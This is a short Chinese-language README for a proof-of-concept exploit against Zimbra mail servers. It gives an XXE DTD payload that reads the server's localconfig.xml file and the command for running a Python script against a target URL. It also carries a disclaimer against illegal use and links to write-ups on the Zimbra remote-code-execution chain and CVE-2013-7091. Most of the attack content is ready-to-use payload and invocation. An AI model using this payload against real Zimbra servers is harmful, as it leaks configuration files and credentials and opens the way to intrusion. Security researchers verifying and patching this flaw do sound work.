# Zimbra POC

## 用法

1. 需要自己在源代码中修改dtd_url为如下内容的dtd地址：

```xml
<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

2. 使用方法：

```bash
python zimbra_poc.py https://target.com
```

3. **POC仅供验证漏洞使用，请勿用于非法用途。**

## 参考资料

1. [《A Saga of Code Executions on Zimbra》](https://blog.tint0.com/2019/03/a-saga-of-code-executions-on-zimbra.html)

2. [What Are XML External Entity (XXE) Attacks](https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/)

3. [漏洞预警 | Zimbra 远程代码执行漏洞](https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247484487&idx=1&sn=f2a8df3343cda9fb16f1dae0962e6dd4&chksm=96f41b2aa183923c08e3c4d1684baef02884d3097cdcd93dc0f656876bdfa7c6005b0c67db59)

4. [CVE-2013-7091 EXP](https://www.exploit-db.com/exploits/30472)

5. [Zimbra Soap API](https://files.zimbra.com/docs/soap_api/8.0.4/soap-docs-804/api-reference/index.html)

6. [《A Saga of Code Executions on Zimbra》RCE漏洞分析+复现过程](https://blog.csdn.net/fnmsd/article/details/88657083)

